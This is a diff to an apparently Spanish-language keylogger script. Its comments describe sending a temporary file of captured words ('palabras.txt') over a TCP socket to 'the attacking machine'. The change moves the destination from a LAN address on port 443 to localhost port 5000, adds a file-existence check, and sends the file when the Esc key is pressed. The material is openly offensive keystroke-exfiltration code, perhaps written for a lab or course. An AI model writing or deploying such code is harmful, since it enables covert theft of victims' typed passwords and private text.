@@ -62,6 +62,9 @@ def reset_palabra():
 # El fichero temporal a la máquina atacante
 def enviar_archivo_sockets(fichero, ip, puerto):
     try:
+        if not os.path.exists(fichero):
+            print("No hay nada que enviar (archivo vacío).")
+            return
         with open('palabras.txt', 'rb') as file:
             contenido = file.read()
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conexion:
@@ -78,12 +81,14 @@ def detener_script():
     enviar_archivo_sockets(fichero_mensaje, direccion_ip_destino, puerto_destino)
 
 
-direccion_ip_destino = '192.168.1.37'
-puerto_destino = '443'
+direccion_ip_destino = '127.0.0.1' # dirección del WSL
+puerto_destino = 5000 # puerto de ejemplo
 fichero_mensaje = 'palabras.txt'
 
 try:
     keyboard.wait('esc')
-except KeyboardInterrupt:
+    detener_script()
     print ("DETENIDO")
+except KeyboardInterrupt:
+    print("INTERUMPIDO")
     pass
